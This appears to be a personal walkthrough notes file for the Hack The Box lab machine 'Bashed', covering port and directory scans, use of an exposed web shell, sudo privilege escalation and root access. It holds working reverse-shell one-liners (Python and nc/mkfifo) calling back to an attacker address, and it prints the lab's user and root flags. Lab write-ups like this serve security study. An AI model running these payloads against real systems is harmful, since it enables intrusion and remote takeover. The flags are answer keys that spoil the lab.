@@ -1,0 +1,154 @@
+Bashed Ip: 10.10.10.68
+
+
+rustscan:
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack
+
+
+nmap:
+PORT   STATE SERVICE REASON  VERSION
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Arrexel's Development Site
+
+
+
+gobuster dir  -u http://10.10.10.68 -w /usr/share/wordlists/dirb/common.txt -t 64      
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.68
+[+] Threads:        64
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2023/01/23 05:32:12 Starting gobuster
+===============================================================
+/css (Status: 301)
+/dev (Status: 301)
+/.hta (Status: 403)
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/fonts (Status: 301)
+/images (Status: 301)
+/index.html (Status: 200)
+/js (Status: 301)
+/php (Status: 301)
+/server-status (Status: 403)
+/uploads (Status: 301)
+===============================================================
+2023/01/23 05:32:21 Finished
+===============================================================
+                                                  
+
+
+gobuster dir  -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64   
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.68
+[+] Threads:        64
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2023/01/23 05:32:43 Starting gobuster
+===============================================================
+/images (Status: 301)
+/uploads (Status: 301)
+/php (Status: 301)
+/css (Status: 301)
+/dev (Status: 301)
+/js (Status: 301)
+/fonts (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2023/01/23 05:36:14 Finished
+===============================================================
+
+
+nikto -h 10.10.10.68    
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.68
++ Target Hostname:    10.10.10.68
++ Target Port:        80
++ Start Time:         2023-01-23 05:33:14 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ IP address found in the 'location' header. The IP is "127.0.1.1".
++ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
++ Server may leak inodes via ETags, header found with file /, inode: 1e3f, size: 55f8bbac32f80, mtime: gzip
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ /config.php: PHP Config file may contain database IDs and passwords.
++ OSVDB-3268: /css/: Directory indexing found.
++ OSVDB-3092: /css/: This might be interesting...
++ OSVDB-3268: /dev/: Directory indexing found.
++ OSVDB-3092: /dev/: This might be interesting...
++ OSVDB-3268: /php/: Directory indexing found.
++ OSVDB-3092: /php/: This might be interesting...
++ OSVDB-3268: /images/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7865 requests: 0 error(s) and 17 item(s) reported on remote host
++ End Time:           2023-01-23 05:41:56 (GMT-5) (522 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+visiting http://10.10.10.68/dev/ we find phpbash and phbminbash.php
+
+visiting this we find a shell as www-data
+
+even though we are www-data we are still able to read the user flag: 392b6916a7a10a2f90ecc594bfababa5
+
+let try to catch a reverse shell on our machine
+
+first, find if python is installed on the attacking machine:
+
+www-data@bashed
+:/home/scriptmanager# which python
+
+/usr/bin/python
+
+good
+
+type this in the webshell:
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
+
+nc -lvnp 1234
+PRIVESC:
+www-data@bashed:/var/www/html/dev$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on bashed:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+    (scriptmanager : scriptmanager) NOPASSWD: ALL
+www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager /bin/bash
+sudo -u scriptmanager /bin/bash
+scriptmanager@bashed:/var/www/html/dev$ 
+
+scriptmanager@bashed:/home$ uname -a
+Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+
+cd to /scripts and echo this line to test.py; start a listener and wait to get root shell.
+echo "import os;os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 9001 >/tmp/f')" > test.py
+
+
+
+root flag: c4f15d68cf4a045b9bf85aac19a1ad45
